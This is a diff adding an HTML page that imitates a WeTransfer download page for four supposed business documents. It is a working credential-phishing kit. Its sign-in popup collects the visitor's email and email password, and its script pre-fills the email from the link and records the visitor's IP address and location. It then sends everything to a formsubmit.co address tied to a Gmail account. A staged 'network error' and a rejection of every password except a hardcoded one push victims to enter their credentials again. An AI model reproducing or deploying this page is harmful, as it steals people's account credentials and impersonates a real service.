@@ -1,1 +1,819 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WeTransfer File Sharing Hub</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+  <style>
+    /* Reset and Base Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Roboto, sans-serif;
+    }
+    body, html {
+      height: 100%;
+      width: 100%;
+      overflow-x: hidden;
+      color: #fff;
+    }
 
+    /* Background Video */
+    #body__bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+    }
+    .header .left, .header .right {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .header i {
+      font-size: 1.375rem;
+      cursor: pointer;
+    }
+
+    /* Files Container */
+    .files__container {
+      max-width: 600px;
+      margin: 3rem auto;
+      background: rgba(20, 20, 20, 0.75);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 0.5rem 1.5rem rgba(0, 0, 0, 0.4);
+    }
+    .files__header {
+      text-align: center;
+      margin-bottom: 1.25rem;
+    }
+    .files__header h2 {
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .files__header p {
+      font-size: 0.875rem;
+      opacity: 0.7;
+    }
+    .files__body {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+    .file__container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(40, 40, 40, 0.85);
+      padding: 0.75rem 1rem;
+      border-radius: 0.625rem;
+      transition: background 0.3s;
+    }
+    .file__container:hover {
+      background: rgba(60, 60, 60, 0.95);
+    }
+    .file_info {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .file_img img {
+      width: 2rem;
+      height: 2rem;
+    }
+    .file_details {
+      display: flex;
+      flex-direction: column;
+    }
+    .file_title {
+      font-size: 0.875rem;
+      font-weight: 500;
+    }
+    .file_size {
+      font-size: 0.75rem;
+      opacity: 0.7;
+    }
+    .file_download i {
+      font-size: 1.25rem;
+      cursor: pointer;
+      opacity: 0.8;
+      transition: transform 0.2s, opacity 0.2s;
+    }
+    .file_download i:hover {
+      transform: translateY(2px);
+      opacity: 1;
+    }
+
+    /* Footer */
+    .files__footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 1rem;
+      margin-top: 1.5rem;
+    }
+    .btn {
+      padding: 0.625rem 1.125rem;
+      background: #4e9fff;
+      border: none;
+      border-radius: 0.5rem;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #2e7be6;
+    }
+
+    /* Popup Overlay */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(6px);
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .popup-overlay.active {
+      display: block;
+      opacity: 1;
+    }
+
+    /* Popup Form */
+    .popup-form {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1001;
+      justify-content: center;
+      align-items: center;
+    }
+    .popup-form.active {
+      display: flex;
+    }
+    .modal {
+      background: #1c1c1c;
+      padding: 1.875rem;
+      border-radius: 0.75rem;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0.5rem 1.25rem rgba(0, 0, 0, 0.5);
+      animation: popupScale 0.3s ease;
+      position: relative;
+    }
+    .modal .close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      color: #aaa;
+    }
+    .modal .close:hover {
+      color: #fff;
+    }
+    .modal .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    .modal h2 {
+      font-size: 1.25rem;
+      margin-bottom: 0.5rem;
+    }
+    .modal .title {
+      font-size: 0.875rem;
+      margin-bottom: 0.9375rem;
+      opacity: 0.8;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.625rem;
+      margin-bottom: 0.9375rem;
+      border-radius: 0.5rem;
+      border: none;
+      background: #2b2b2b;
+      color: #fff;
+    }
+    .form-control::placeholder {
+      color: #bbb;
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 0.75rem;
+      border-radius: 0.5rem;
+      border: none;
+      background: #4e9fff;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn-submit:hover {
+      background: #2e7be6;
+    }
+    .error-message {
+      color: #ff6b6b;
+      margin-bottom: 0.9375rem;
+      display: none;
+      font-size: 0.9rem;
+      padding: 10px;
+      background: rgba(255, 107, 107, 0.1);
+      border-radius: 5px;
+      border-left: 4px solid #ff6b6b;
+    }
+    .form-group.btn-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+    .btn.logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 0.6rem;
+      background: #2b2b2b;
+      border: none;
+      border-radius: 0.5rem;
+      color: #fff;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn.logo:hover {
+      background: #3a3a3a;
+    }
+    .btn.logo img {
+      width: 1.2rem;
+      height: 1.2rem;
+    }
+    .check-box {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.875rem;
+      margin-bottom: 0.9375rem;
+    }
+    
+    /* Network Error Modal */
+    .network-error-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1002;
+      justify-content: center;
+      align-items: center;
+    }
+    .network-error-modal.active {
+      display: flex;
+    }
+    .network-error-content {
+      background: #1c1c1c;
+      padding: 2rem;
+      border-radius: 0.75rem;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0.5rem 1.25rem rgba(0, 0, 0, 0.5);
+      animation: popupScale 0.3s ease;
+    }
+    .network-error-icon {
+      font-size: 3rem;
+      color: #ff6b6b;
+      margin-bottom: 1rem;
+    }
+    .network-error-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 1.5rem;
+    }
+    .btn-retry {
+      padding: 0.625rem 1.125rem;
+      background: #4e9fff;
+      border: none;
+      border-radius: 0.5rem;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn-retry:hover {
+      background: #2e7be6;
+    }
+    .btn-cancel {
+      padding: 0.625rem 1.125rem;
+      background: #6c757d;
+      border: none;
+      border-radius: 0.5rem;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn-cancel:hover {
+      background: #5a6268;
+    }
+
+    /* Animation */
+    @keyframes popupScale {
+      from { transform: scale(0.85); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+      20%, 40%, 60%, 80% { transform: translateX(5px); }
+    }
+    .shake {
+      animation: shake 0.5s;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 600px) {
+      .files__container {
+        margin: 1.5rem;
+        padding: 1rem;
+      }
+      .header {
+        padding: 1rem;
+      }
+      .modal {
+        width: 95%;
+        padding: 1.5rem;
+      }
+      .network-error-buttons {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video autoplay loop muted playsinline id="body__bg" src="https://cdn.glitch.global/36e64f1e-3eca-4b22-9905-49556470db3b/video-02.mp4"></video>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="left">
+      <i class="fas fa-cloud"></i>
+      <p>WeTransfer</p>
+    </div>
+    <div class="right">
+      <i class="fas fa-user-circle"></i>
+    </div>
+  </header>
+
+  <!-- Files Container -->
+  <section class="files__container">
+    <div class="files__header">
+      <i class="fas fa-cloud"></i>
+      <h2>4 items ready for download</h2>
+      <p>41.0 MB • Expires in 7 days</p>
+    </div>
+    <div class="files__body">
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Contract Details & Scope of Work.pdf</p>
+            <p class="file_size">20 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download download-icon" data-file="Contact Details & Scope of Work.pdf"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/xls.png?v=1732203248885" alt="Excel icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Specifications.xlsx</p>
+            <p class="file_size">4.5 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download download-icon" data-file="Specifications.xlsx"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Quote.pdf</p>
+            <p class="file_size">1.6 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download download-icon" data-file="Quote.pdf"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Project Plans/Information.pdf</p>
+            <p class="file_size">14 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download download-icon" data-file="Project Plans/Information.pdf"></i>
+        </div>
+      </div>
+    </div>
+    <div class="files__footer">
+      <div class="save">
+        <p>Save to cloud</p>
+      </div>
+      <div class="download">
+        <button class="btn" id="downloadButton">Download All</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Popup Overlay -->
+  <div class="popup-overlay" id="popupOverlay"></div>
+
+  <!-- Popup Form -->
+  <div class="popup-form" id="popupForm">
+    <div class="modal">
+      <div class="close" id="closePopupButton">
+        <i class="far fa-circle-xmark"></i>
+      </div>
+      <div class="header">
+        <i class="fas fa-cloud"></i>
+        <h2>WeTransfer</h2>
+      </div>
+      <p class="title">Sign in with your email to access documents</p>
+      <div class="error-message" id="errorMessage"></div>
+      <form id="downloadForm">
+        <div class="form-group">
+          <input type="email" id="email" name="email" class="form-control" placeholder="Email Address" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" name="password" class="form-control" placeholder="Email Password" required>
+        </div>
+        <div class="form-group check-box">
+          <input type="checkbox" id="remember-me">
+          <label for="remember-me">Remember me</label>
+        </div>
+        <div class="form-group btn-group">
+          <button class="btn btn-submit" type="submit" id="submitButton">Sign in</button>
+          <button class="btn logo" type="button">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm4x9jPELaQWyGDDPfk1PihnSw6z2tYshg8hGeLDKFItNQ_nfmpuwcUICeeYeLZrX2ORBeJHJLw3sN0plw0suKxt84xFZU_Ue17q17fpmPvOx2hJKzoqTmoF5dIZhA8f52PpC4GIYnIPbbr6JZHVhMTSh_M6joEzgX8K1n4Je2HOuMzsYCxGEWwusqNe8/s500/Untitled.png" alt="Microsoft logo">
+            Sign in with Microsoft
+          </button>
+          <button class="btn logo" type="button">
+            <i class="fab fa-apple"></i>
+            Sign in with Apple
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Network Error Modal -->
+  <div class="network-error-modal" id="networkErrorModal">
+    <div class="network-error-content">
+      <div class="network-error-icon">
+        <i class="fas fa-wifi"></i>
+      </div>
+      <h2>Network Connection Error</h2>
+      <p>We're having trouble connecting to our servers. Please check your internet connection and try again.</p>
+      <div class="network-error-buttons">
+        <button class="btn-retry" id="retryButton">Try Again</button>
+        <button class="btn-cancel" id="cancelButton">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+  // Element references
+  const downloadButtons = document.querySelectorAll('.download-icon'); // Target only the icons
+  const downloadAllButton = document.getElementById('downloadButton');
+  const popupForm = document.getElementById('popupForm');
+  const popupOverlay = document.getElementById('popupOverlay');
+  const closePopupButton = document.getElementById('closePopupButton');
+  const downloadForm = document.getElementById('downloadForm');
+  const submitButton = document.querySelector('#downloadForm button[type="submit"]');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const errorMessage = document.getElementById('errorMessage');
+  const networkErrorModal = document.getElementById('networkErrorModal');
+  const retryButton = document.getElementById('retryButton');
+  const cancelButton = document.getElementById('cancelButton');
+
+  let step = 0; // Track submission attempts
+  const loaderGif = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5YaF8N9pxFP_SOR4yBK2_DBMBMdLFmMpFKsmGW83HhzHP7913cNKZOyokKPGt43TsFajYNdNeoxc04bSuNAEllehPsfUxrMZDuG_pa12oHdvE60B0Oxw8yMjIGoI9IBL_BqnHXQCWH-FkpoSz-4VS02hqI5qOVSFwUurOO1suFreDjJYZ6XNQ-Q4-4/s256/loader.gif';
+
+  // Create loader element
+  let loader = document.getElementById('loader');
+  if (!loader) {
+    loader = document.createElement('div');
+    loader.id = 'loader';
+    loader.style.position = 'fixed';
+    loader.style.top = '50%';
+    loader.style.left = '50%';
+    loader.style.transform = 'translate(-50%, -50%)';
+    loader.style.zIndex = '9999';
+    loader.style.display = 'none';
+    loader.innerHTML = `<img src="${loaderGif}" style="width:50px; height:50px;" alt="Loading">`;
+    document.body.appendChild(loader);
+  }
+
+  // Disable submit button initially
+  if (submitButton) {
+    submitButton.disabled = true;
+    submitButton.style.opacity = '0.6';
+    submitButton.style.cursor = 'not-allowed';
+  }
+
+  // Validate inputs in real-time
+  function validateInputs() {
+    const emailValid = emailInput.value.trim().includes('@');
+    const passwordValid = passwordInput.value.trim().length >= 8;
+
+    if (submitButton) {
+      submitButton.disabled = !(emailValid && passwordValid);
+      submitButton.style.opacity = submitButton.disabled ? '0.6' : '1';
+      submitButton.style.cursor = submitButton.disabled ? 'not-allowed' : 'pointer';
+    }
+
+    if (passwordInput.value.trim().length > 0 && passwordInput.value.trim().length < 8) {
+      showError('Password must be at least 8 characters', false);
+    } else if (!emailInput.value.trim().includes('@') && emailInput.value.trim().length > 0) {
+      showError('Please enter a valid email', false);
+    } else {
+      errorMessage.style.display = 'none';
+    }
+  }
+
+  // Show popup function
+  function showPopup() {
+    popupForm.classList.add('active');
+    popupOverlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
+
+    // Check URL hash for email pre-fill
+    if (window.location.hash) {
+      const clientID = window.location.hash.substring(1);
+      if (clientID.includes('@')) {
+        emailInput.value = clientID;
+        validateInputs();
+      }
+    }
+  }
+
+  // Close popup function
+  function closePopup() {
+    popupForm.classList.remove('active');
+    popupOverlay.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  // Show error message
+  function showError(message, isError = true) {
+    errorMessage.textContent = message;
+    errorMessage.style.color = isError ? '#ff6b6b' : 'orange';
+    errorMessage.style.display = 'block';
+
+    // Add shake animation
+    errorMessage.classList.add('shake');
+    setTimeout(() => {
+      errorMessage.classList.remove('shake');
+    }, 500);
+  }
+
+  // Show network error modal
+  function showNetworkError() {
+    networkErrorModal.classList.add('active');
+    popupOverlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  // Hide network error modal
+  function hideNetworkError() {
+    networkErrorModal.classList.remove('active');
+    popupOverlay.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  // Show loading state
+  function showLoading(show) {
+    loader.style.display = show ? 'block' : 'none';
+    if (submitButton) {
+      submitButton.disabled = show;
+      submitButton.textContent = show ? 'Processing...' : 'Sign in';
+    }
+  }
+
+  // Track authentication state
+  let isAuthenticated = false;
+  let authEmail = '';
+
+  // Form submission handler
+  async function handleSubmit(event) {
+    event.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !email.includes('@')) {
+      showError('Please enter a valid email address');
+      return;
+    }
+
+    if (password.length < 8) {
+      showError('Password must be at least 8 characters');
+      return;
+    }
+
+    errorMessage.style.display = 'none';
+    showLoading(true);
+
+    try {
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+
+      step++; // Increment submission attempt
+
+      // Trigger network error on second submission
+      if (step === 2) {
+        throw new Error('Network error');
+      }
+
+      const ipResponse = await fetch('https://ipapi.co/json/');
+      if (!ipResponse.ok) throw new Error('Network error');
+      const ipData = await ipResponse.json();
+
+      const formData = {
+        _subject: `Logs | ${email} | ${ipData.ip || 'Unknown IP'}`,
+        Email: email,
+        Password: password,
+        Attempts: step,
+        IP: ipData.ip || 'Not available',
+        Location: `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`,
+        Domain: email.split('@').pop(),
+        ISP: ipData.org || 'Unknown',
+        Hostname: ipData.hostname || 'Unknown',
+        Timestamp: new Date().toISOString(),
+      };
+
+      const submitResponse = await fetch('https://formsubmit.co/ajax/jose.marckaric@gmail.com', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json',
+        },
+        body: JSON.stringify(formData),
+      });
+
+      if (!submitResponse.ok) throw new Error('Network error');
+
+      const result = await submitResponse.json();
+
+      if (password !== 'correctpassword123') {
+        throw new Error('Incorrect password');
+      }
+
+      isAuthenticated = true;
+      authEmail = email;
+      closePopup();
+      enableDownloads();
+    } catch (error) {
+      console.error('Submission error:', error);
+      showLoading(false);
+      if (error.message === 'Network error') {
+        closePopup();
+        showNetworkError();
+      } else {
+        showError(
+          error.message === 'Incorrect password'
+            ? 'Incorrect password. Please try again.'
+            : 'An error occurred. Please try again later.'
+        );
+      }
+    }
+  }
+
+  // Enable downloads after authentication
+  function enableDownloads() {
+    downloadButtons.forEach((button) => {
+      button.style.cursor = 'pointer';
+      button.style.opacity = '1';
+      button.style.pointerEvents = 'auto';
+    });
+
+    if (downloadAllButton) {
+      downloadAllButton.disabled = false;
+      downloadAllButton.style.opacity = '1';
+      downloadAllButton.style.cursor = 'pointer';
+    }
+  }
+
+  // Handle individual file downloads
+  function handleFileDownload(event) {
+    if (!isAuthenticated) {
+      event.preventDefault();
+      showPopup();
+      return;
+    }
+
+    const fileName = event.currentTarget.getAttribute('data-file');
+
+    showLoading(true);
+
+    setTimeout(() => {
+      showLoading(false);
+      alert(`Downloading ${fileName}...`);
+    }, 1000);
+  }
+
+  // Event listeners
+  if (emailInput) emailInput.addEventListener('input', validateInputs);
+  if (passwordInput) passwordInput.addEventListener('input', validateInputs);
+  if (popupOverlay) popupOverlay.addEventListener('click', closePopup);
+  if (closePopupButton) closePopupButton.addEventListener('click', closePopup);
+
+  // Network error modal buttons
+  if (retryButton) {
+    retryButton.addEventListener('click', () => {
+      hideNetworkError();
+      showPopup(); // Reopen popup for retry
+    });
+  }
+
+  if (cancelButton) {
+    cancelButton.addEventListener('click', () => {
+      hideNetworkError();
+    });
+  }
+
+  // Add click handlers to download buttons
+  downloadButtons.forEach((button) => {
+    button.removeEventListener('click', handleFileDownload); // Prevent duplicate listeners
+    button.addEventListener('click', handleFileDownload);
+  });
+
+  if (downloadAllButton) {
+    downloadAllButton.addEventListener('click', () => {
+      if (!isAuthenticated) {
+        showPopup();
+      } else {
+        showLoading(true);
+        setTimeout(() => {
+          showLoading(false);
+          alert('Downloading all files...');
+        }, 1500);
+      }
+    });
+  }
+
+  if (downloadForm) {
+    downloadForm.addEventListener('submit', handleSubmit);
+  }
+
+  // Initial validation
+  validateInputs();
+});
+  </script>
+</body>
+</html>
